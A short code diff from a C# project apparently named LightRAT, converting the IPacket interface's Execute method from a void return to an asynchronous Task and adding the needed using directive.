@@ -1,7 +1,9 @@
-﻿namespace LightRAT.Network.Packets
+﻿using System.Threading.Tasks;
+
+namespace LightRAT.Network.Packets
 {
     public interface IPacket
     {
-        void Execute(Client client);
+        Task Execute(Client client);
     }
 }
